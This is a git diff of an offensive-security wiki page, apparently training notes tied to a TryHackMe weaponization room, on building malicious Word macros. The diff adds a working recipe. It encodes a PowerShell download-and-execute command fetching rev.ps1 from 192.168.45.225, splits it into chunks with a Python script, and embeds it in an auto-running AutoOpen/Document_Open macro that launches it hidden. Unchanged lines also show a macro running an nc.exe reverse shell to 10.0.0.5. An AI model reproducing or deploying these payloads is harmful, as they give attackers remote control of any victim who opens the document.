@@ -1,8 +1,4 @@
----
-description: MITRE ATT&CK™ T1137 - Phishing
----
-
-# VBA
+# VBA (Macro)
 
 ## Theory
 
@@ -11,7 +7,7 @@ This technique will build a primitive word document that will auto execute the V
 VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.
 
 {% hint style="info" %}
-VBAs/macros by themselves do not inherently bypass any detections.
+VBAs/macros by themselves do not inherently bypass any detection.
 {% endhint %}
 
 ## Practice
@@ -22,8 +18,8 @@ VBAs/macros by themselves do not inherently bypass any detections.
 2 - Hit ALT+F11 to go into Macro editor\
 3 - Double click into the "This document" and CTRL+C/V the below:
 
-```bash
-#Macro
+```vba
+'Macro
 Private Sub Document_Open()
   MsgBox "game over", vbOKOnly, "game over"
   a = Shell("C:\tools\shell.cmd", vbHide)
@@ -37,6 +33,59 @@ C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 
 4 - ALT+F11 to switch back to the document editing mode\
 5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.
+
+{% hint style="danger" %}
+Using the newer **.docx**  extension, we can't embed or save the macro in the document. The macro will not be persistent.
+{% endhint %}
+{% endtab %}
+
+{% tab title="ActiveX Macro" %}
+We may leverage ActiveX Objects which provide access to underlying operating system commands using the following VBA template. This can be achieved with WScript through the [Windows Script Host Shell](wsh.md) object.
+
+Fisrt, create a base64 powershell payload
+
+```bash
+$ echo -n 'iex(iwr http://192.168.45.225/rev.ps1 -UseBasicParsing)'|iconv -t 'utf-16le'|base64 -w0
+aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAA...
+```
+
+Secondly, we may use this python script to split the base64-encoded string into smaller chunks (50 chars)
+
+{% code title="chunk_vba_payload.py" %}
+```python
+str = "powershell.exe -nop -w hidden -e aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAA..."
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+{% endcode %}
+
+```bash
+$ python chunk_payload.py 
+```
+
+Then, add the following macro in your word document (see [Basic Usage](vba.md#basic-usage)) using the generated payload
+
+```vba
+'Macro
+Sub AutoOpen()
+  MyMacro
+End Sub
+
+Sub Document_Open()
+  MyMacro
+End Sub
+
+Sub MyMacro()
+  Dim Str As String
+  Str = Str + "powershell.exe -nop -w hidden -e aQBlAHgAKABpAHcAc"
+  Str = Str + "gAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQA"
+  Str = Str + "uADIAMgA1AC8AcgBlAHYALgBwAHMAMQAgAC0AVQBzAGUAQgBhA"
+  Str = Str + "HMAaQBjAFAAYQByAHMAaQBuAGcAKQA="
+  CreateObject("Wscript.Shell").Run Str
+End Sub
+```
 {% endtab %}
 
 {% tab title="Ivy" %}
@@ -93,5 +142,3 @@ cscript //E:jscript stageless.png
 ## Resources
 
 {% embed url="https://tryhackme.com/room/weaponization" %}
-
-{% embed url="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" %}
